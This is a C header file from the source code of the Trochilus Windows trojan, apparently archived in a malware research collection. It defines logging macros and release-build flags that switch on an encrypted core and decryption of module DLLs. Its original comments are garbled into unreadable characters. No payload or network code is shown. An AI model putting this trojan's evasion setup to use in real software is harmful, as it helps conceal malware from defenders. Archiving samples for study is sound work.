/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

#include <TCHAR.h>
#include <stdlib.h>
#include <malloc.h> 
#include "CommonDefines.h"
#include "ods.h"
#include "AutoCleanup.h"
#include "tstring.h"

#ifdef OUTPUT_LOG
#	define errorLogE ErrorODSE
#	define errorLog ErrorODS
#	define infoLogE InfoODSE
#	define infoLog InfoODS
#	define debugLogE DebugODSE
#	define debugLog DebugODS
#else
#	define errorLogE 
#	define errorLog 
#	define infoLogE 
#	define infoLog 
#	define debugLogE 
#	define debugLog 
#endif

//���servantshell�Ŀ���
#ifndef _DEBUG
#	define USE_ENCRYPTED_CORE
#endif

//���servant�Ŀ���
#ifndef _DEBUG
#	define DATMODULE
#endif
//#define DATMODULE

#ifdef DATMODULE
#	define DECRYPT_MODULE	//�Ƿ��ģ��dll���н���
#else
#	define USE_SYS_API		//�Ƿ�ʵ��ϵͳAPI��װ��ģ��dll
#endif
